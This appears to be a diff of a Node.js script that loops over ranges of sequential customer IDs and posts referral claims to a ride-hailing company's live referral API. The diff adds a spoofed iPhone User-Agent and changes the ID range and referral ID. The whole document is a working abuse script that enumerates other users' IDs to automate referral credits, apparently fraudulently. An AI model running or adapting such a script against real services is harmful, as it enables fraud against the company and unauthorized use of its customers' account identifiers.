@@ -5,7 +5,8 @@ var qs = require('querystring');
 // Set the headers
 var headers = {
     // 'User-Agent':       'Super Agent/0.0.1',
-    'Content-Type':     'application/json'
+    'Content-Type':     'application/json',
+    'User-Agent': 'Apple-iPhone6C1/'
 }
 var count = 0;
 var userlist = [];
@@ -16,15 +17,16 @@ var baseId = 538589523
 var baseUrl = 'http://api.gojek.co.id/gojek/customer/referral'
 var options = {}
 
-for (baseId=544728650; baseId<544728900; baseId++) {
+for (baseId=545156900; baseId<545157300; baseId++) {
 
   // Configure the request
+  // Apple-iPhone6C1/
   options = {
       url: baseUrl,
       method: 'POST',
       headers: headers,
       body: JSON.stringify({
-        referralId: 544469336,
+        referralId: 543769084,
         referrerId: baseId+1
       })
   }
@@ -57,3 +59,4 @@ for (baseId=544728650; baseId<544728900; baseId++) {
       // }
   })
 }
+console.log(options)
